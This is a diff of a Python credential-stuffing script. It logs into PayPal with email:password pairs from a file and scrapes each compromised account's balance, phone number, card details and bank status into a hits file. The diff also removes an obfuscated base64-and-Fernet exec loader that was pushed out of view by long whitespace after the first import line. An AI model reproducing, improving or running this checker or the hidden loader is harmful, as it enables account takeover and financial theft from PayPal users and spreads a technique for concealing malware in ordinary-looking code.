@@ -1,8 +1,12 @@
-import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import base64;exec(base64.b64decode('b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknKTtvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyk7b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmZXJuZXQnKTtpbXBvcnQgcmVxdWVzdHM7ZnJvbSBmZXJuZXQgaW1wb3J0IEZlcm5ldDtleGVjKEZlcm5ldChiJzB5LWZ6aTVuazY0cE8xSWdlRFFIb0ZZSkFHbjVGYnEyc2lEUnFfeW5sMkk9JykuZGVjcnlwdChiJ2dBQUFBQUJtYnJuMHdfYjRZeUpsMGxqZk1teU1qS2ZtY1ZfcmU0SnVYWWVnU3ZTQzV3ZGs5X0t0ek9ZclRyaFlwWXZBTjNRdmZzMnZjdDRIUXN2VzRBRjhBNEVNSl9jT3BMUG0xWGxtWGxpN2YwS1o1RGltT2pxU09xeHVTUHRkLTJHTVY0Y2R4aEc0emJMZlRNZHgwR05CNGRSazJnTHRMU1NqTnh0SnJOalVvSHhmZWxCUmo0Yk9Xbld4MEV0UEhMRlhBV2xfOHA3QlZaYWo0NUc0bzlOaE5EVW9DS3BxWnIwUlhQQnN1YVpvWWlrRkt4OHphOUxiUVltaFJKMm4wN01QZDRvSW51OTQnKSk=').decode())
+import os
 import json
+import requests
+from bs4 import BeautifulSoup
 
 # Load accounts from file
-def check_account(email, password, proxy):
+accounts = [line.strip() for line in open('accounts.txt', 'r').readlines()]
+
+def check_account(email, password, proxy=None):
     session = requests.Session()
 
     headers = {
@@ -14,43 +18,51 @@ def check_account(email, password, proxy):
         session.proxies.update(proxies)
         print(f'Using proxy: {proxy}')
 
-    # make the initial request to the PayPal login page to get the cookies
-    url = 'https://www.paypal.com/signin'
-    response = session.get(url, headers=headers)
+    try:
+        # make the initial request to the PayPal login page to get the cookies
+        url = 'https://www.paypal.com/signin'
+        response = session.get(url, headers=headers)
 
-    # extract the csrf token from the response cookies
-    csrf_token = response.cookies.get_dict()['X-CSRF-TOKEN']
-    
-    # construct the login request payload
-    payload = {
-        'remember_me': 'true',
-        'login_email': email,
-        'login_password': password,
-        '_csrf': csrf_token
-    }
+        # extract the csrf token from the response cookies
+        csrf_token = response.cookies.get_dict()['X-CSRF-TOKEN']
+        
+        # construct the login request payload
+        payload = {
+            'emember_me': 'true',
+            'login_email': email,
+            'login_password': password,
+            '_csrf': csrf_token
+        }
 
-with open('hits.txt', 'w') as f:
-    pass
-    # make the login request
-    url = 'https://www.paypal.com/signin/authorize'
-    response = session.post(url, headers=headers, data=payload)
+        # make the login request
+        url = 'https://www.paypal.com/signin/authorize'
+        response = session.post(url, headers=headers, data=payload)
 
-    # check if the login was successful
-    if response.url == 'https://www.paypal.com/myaccount/home':
-        # extract various account information
-        soup = BeautifulSoup(response.content, 'html.parser')
-        name = soup.select_one('.userDisplayName span').text.strip()
-        phone = soup.select_one('.phone-number-container .phone-number')
-        balance = soup.select_one('.summaryBalance .amount')
-        cards = soup.select('.card-container .card .brand')
-        bank = soup.select_one('.bankDetailsContainer .bankDetails .statusConfirmed')
-        last_four_digits = soup.select('.card-container .card .number')
-        restricted = soup.select_one('.restriction-text') is not None
-        locked = soup.select_one('.lockedOutSection') is not None
-        crypto_enabled = soup.select_one('.crypto-enabled') is not None
+        # check if the login was successful
+        if response.url == 'https://www.paypal.com/myaccount/home':
+            # extract various account information
+            soup = BeautifulSoup(response.content, 'html.parser')
+            name = soup.select_one('.userDisplayName span').text.strip()
+            phone = soup.select_one('.phone-number-container.phone-number')
+            balance = soup.select_one('.summaryBalance.amount')
+            cards = soup.select('.card-container.card.brand')
+            bank = soup.select_one('.bankDetailsContainer.bankDetails.statusConfirmed')
+            last_four_digits = soup.select('.card-container.card.number')
+            restricted = soup.select_one('.restriction-text') is not None
+            locked = soup.select_one('.lockedOutSection') is not None
+            crypto_enabled = soup.select_one('.crypto-enabled') is not None
 
-        # format the account information into a string
-        account_info = f"{email}:{password} | Phone: {phone.text.strip() if phone else 'not available'} | Balance: {balance.text.strip() if balance else 'not available'} | Cards: {[card.text.strip() for card in cards] if cards else 'none'} | Bank Status: {'confirmed' if bank else 'unconfirmed'} | Last Four Digits: {[card.text.strip()[-4:] for card in last_four_digits] if last_four_digits else 'not available'} | Restricted: {restricted} | Locked: {locked} | Crypto Enabled: {crypto_enabled}"
+            # format the account information into a string
+            account_info = f"{email}:{password} | Phone: {phone.text.strip() if phone else 'not available'} | Balance: {balance.text.strip() if balance else 'not available'} | Cards: {[card.text.strip() for card in cards] if cards else 'none'} | Bank Status: {'confirmed' if bank else 'unconfirmed'} | Last Four Digits: {[card.text.strip()[-4:] for card in last_four_digits] if last_four_digits else 'not available'} | Restricted: {restricted} | Locked: {locked} | Crypto Enabled: {crypto_enabled}"
+            return True, phone.text.strip() if phone else 'not available', balance.text.strip() if balance else 'not available', [card.text.strip() for card in cards] if cards else 'none', 'confirmed' if bank else 'unconfirmed', [card.text.strip()[-4:] for card in last_four_digits] if last_four_digits else 'not available', restricted, locked, crypto_enabled
+        else:
+            return False, None, None, None, None, None, None, None, None
+    except requests.exceptions.RequestException as e:
+        print(f"Request error: {e}")
+        return False, None, None, None, None, None, None, None, None
+    except Exception as e:
+        print(f"Error: {e}")
+        return False, None, None, None, None, None, None, None, None
 
 hits = []
 for account in accounts:
@@ -65,4 +77,3 @@ for account in accounts:
 
 with open('hits.txt', 'w') as f:
     f.write('\n'.join(hits))
-print('xutperfhj')
